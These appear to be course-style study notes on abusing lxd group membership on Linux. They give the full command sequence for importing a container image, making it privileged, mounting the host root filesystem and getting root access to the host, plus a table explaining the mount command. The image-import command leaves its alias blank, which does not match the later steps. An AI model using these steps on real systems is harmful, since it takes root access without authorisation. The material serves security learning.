
## Linux Containers

Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.
#### Linux Daemon

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:
```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.
```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias 
```
![[Pasted image 20250709204342.png]]


After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

Containers

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

Containers

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
```


```
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Let's break it down:
Part	Meaning
lxc config device add	Adds a device (e.g. disk, nic, gpu) to a container
privesc	Name of the container you're modifying (the target container)
host-root	Name you're giving this new device (can be any label)
disk	You're mounting a disk (filesystem path)
source=/	You're mounting the entire root (/) of the host
path=/mnt/root	Inside the container, this will be accessible at /mnt/root
recursive=true	Ensures all subdirectories of / are mounted recursively

